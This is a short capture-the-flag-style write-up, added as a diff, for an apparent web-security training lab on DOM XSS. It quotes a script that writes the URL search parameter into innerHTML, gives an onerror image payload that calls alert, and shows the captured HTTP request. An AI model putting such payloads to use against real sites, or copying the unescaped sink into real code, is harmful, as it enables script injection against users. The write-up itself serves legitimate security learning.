@@ -1,0 +1,39 @@
+DOM XSS in innerHTML sink using source location.search
+
+Again, we check the source page to see how the script operates
+
+
+<script>
+    function doSearchQuery(query) {
+        document.getElementById('searchMessage').innerHTML = query;
+    }
+    var query = (new URLSearchParams(window.location.search)).get('search');
+    if(query) {
+        doSearchQuery(query);
+    }
+</script>
+
+Okay, no encoding or characters escaped, should be reasonably easy.
+
+A simple payload like
+
+<img src=xss onerror=alert(1337)>
+
+will do the trick.
+
+Request for above payload:
+
+GET /xss HTTP/1.1
+Host: acb81ffd1e3f5fac80a5278800fc0029.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://acb81ffd1e3f5fac80a5278800fc0029.web-security-academy.net/?search=%3Cimg+src%3Dxss+onerror%3Dalert%281337%29%3E
+Cookie: session=UJ20JbFSj2MCLbzjQcokOD9I8eZCUuXe
+
+
+
+
+Note that the payload does not show up properly in the request. Isn't DOM XSS fun?
